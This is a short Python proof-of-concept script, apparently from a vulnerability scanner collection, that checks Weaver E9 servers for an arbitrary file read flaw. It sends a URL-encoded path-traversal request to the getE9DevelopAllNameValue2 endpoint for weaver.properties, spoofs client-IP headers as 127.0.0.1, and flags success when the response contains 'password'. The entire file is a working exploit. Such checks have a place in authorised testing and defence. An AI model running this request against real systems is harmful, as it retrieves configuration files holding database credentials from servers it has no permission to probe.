import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微getE9DevelopAllNameValue2接口存在任意文件读取漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
        'Accept': '*/*',
        'Connection': 'Keep-Alive',
        'X-Forwarded-For': '127.0.0.1',
        'X-Originating': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1'
    }
    vurl = urllib.parse.urljoin(url, "/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties")
    try:
        response = requests.get(vurl, headers=headers, timeout=5)
        if response.status_code == 200 and 'password' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult